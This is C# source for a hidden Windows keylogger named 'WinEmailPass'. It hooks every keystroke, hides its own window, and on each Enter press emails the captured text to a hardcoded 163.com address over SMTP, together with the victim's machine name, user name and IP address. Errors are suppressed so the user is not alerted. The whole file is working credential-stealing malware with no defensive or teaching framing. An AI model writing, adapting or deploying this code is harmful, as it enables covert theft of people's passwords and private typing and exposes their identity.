using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;
using System.Net;
using System.IO;
using System.Threading;

namespace WinEmailPass
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        KeyboardHook k_hook = new KeyboardHook();
        string KeybordValue;
        string value = "";
        string computerName;
        string LoginName;
        string IP;

        //
        byte[] byData = new byte[100];
        char[] charData = new char[1000];

        private void seachPass() 
        {
            string userid = "user";  //用户名
            string yjaddress = "iseseame@163.com"; // It's my test Email ,If you have any problem,please Email me .
            string mm = "hande1234";  //It's Password.But it's not password;
            string[] fasong = yjaddress.Split('@');  
            string[] fs = fasong[1].Split('.');    

            string yjshou = yjaddress;   //收件人邮箱

            string zt = "SubjectTest";  //邮件主题 
            string content = computerName + "_" + LoginName + "_" + IP+"_"+value;   //邮件正文 

            //发送
            SmtpClient client = new SmtpClient("smtp." + fs[0].ToString().Trim() + ".com");  //设置邮件协议  eg:smtp.163.com
            client.UseDefaultCredentials = false;
            client.DeliveryMethod = SmtpDeliveryMethod.Network;  //通过网络发送到Smtp服务器
            client.Credentials = new NetworkCredential(fasong[0].ToString(), mm);
            MailMessage mmsg = new MailMessage(new MailAddress(yjaddress), new MailAddress(yjshou));  //发件人收件人邮箱地址


            mmsg.Subject = zt;
            mmsg.SubjectEncoding = Encoding.UTF8;
            mmsg.Body = content;
            mmsg.BodyEncoding = Encoding.UTF8;
            mmsg.IsBodyHtml = true;
            mmsg.Priority = MailPriority.High;  //优先级

            try
            {
                client.Send(mmsg);
               // MessageBox.Show("发送成功！", "tips");
            }
            catch (System.Exception ex)
            {
               // MessageBox.Show(ex.Message);
            }

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            k_hook.KeyDownEvent += new KeyEventHandler(hook_KeyHandler);//钩住键按下 
            k_hook.Start();          
            this.ShowInTaskbar = false;
            this.Visible = false; //不显示主窗体 任务管理器中也找不到。
            computerName = Environment.MachineName;
            //string ss = Environment.UserDomainName;
            LoginName = Environment.UserName;
            GetAddressIP();


        }

        private void hook_KeyHandler(object ob, KeyEventArgs e)
        {
            int key = e.KeyValue;
            if (e.KeyValue == (int)Keys.Enter)
            {
                value = "";
                value = KeybordValue;
                byData = System.Text.Encoding.Default.GetBytes(value);
                KeybordValue = "";               
                                
               // Read();
                if (value != "") 
                {
                    seachPass();
                    Thread.Sleep(1000);
                }
            }
            else
            {
                KeybordValue += GetChar(key);

            }
        }


        public string GetChar(int key)
        {
            string ch = "";
            switch (key)
            {
                #region 符号
                case (int)Keys.Oemcomma:
                    ch = "<"; break;
                case (int)Keys.OemPeriod:
                    ch = ">"; break;
                case (int)Keys.Oemtilde:
                    ch = "~"; break;
                case (int)Keys.OemSemicolon:
                    ch = ";"; break;
                case (int)Keys.OemQuotes:
                    ch = "\""; break;
                case (int)Keys.OemPipe:
                    ch = "|"; break;
                case (int)Keys.OemCloseBrackets:
                    ch = "}"; break;
                case (int)Keys.OemOpenBrackets:
                    ch = "{"; break;
                case (int)Keys.OemQuestion:
                    ch = "?"; break;
                case (int)Keys.Space:
                    ch = ""; break;  //space   取消
                case (int)Keys.Decimal:
                    ch = "."; break;
                case 16:
                    ch = ""; break;
                #endregion

                #region 小键盘 0~9
                case (int)Keys.NumPad0:
                    ch = "0"; break;
                case (int)Keys.NumPad1:
                    ch = "1"; break;
                case (int)Keys.NumPad2:
                    ch = "2"; break;
                case (int)Keys.NumPad3:
                    ch = "3"; break;
                case (int)Keys.NumPad4:
                    ch = "4"; break;
                case (int)Keys.NumPad5:
                    ch = "5"; break;
                case (int)Keys.NumPad6:
                    ch = "6"; break;
                case (int)Keys.NumPad7:
                    ch = "7"; break;
                case (int)Keys.NumPad8:
                    ch = "8"; break;
                case (int)Keys.NumPad9:
                    ch = "9"; break;
                #endregion


                default: ch = "" + (char)key; break;


            }

            return ch;
        }

        public void Read()
        {
            string path = Environment.CurrentDirectory + @"\text.txt";
            try
            {
                if (File.Exists(path) != true) 
                {
                    FileStream fsw = new FileStream(@path, FileMode.OpenOrCreate);
                    StreamWriter sww = new StreamWriter(fsw);
                    sww.WriteLine("");
                    sww.Close();
                }
                FileStream fs = new FileStream(path, FileMode.Create);
                StreamWriter sw = new StreamWriter(fs);
                //开始写入
                sw.Write(value);
                //清空缓冲区
                sw.Flush();
                //关闭流
                sw.Close();
                fs.Close();
                
            }
            catch (IOException e)
            {
                Console.WriteLine(e.ToString());
            }
        }
        
        /// <summary>
        /// 获取本地IP地址信息
        /// </summary>
        void GetAddressIP()
        {
            ///获取本地的IP地址
            string AddressIP = string.Empty;
            foreach (IPAddress _IPAddress in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
            {
                if (_IPAddress.AddressFamily.ToString() == "InterNetwork")
                {
                    AddressIP = _IPAddress.ToString();
                }
            }
            IP = AddressIP;
        }
       
    }
}
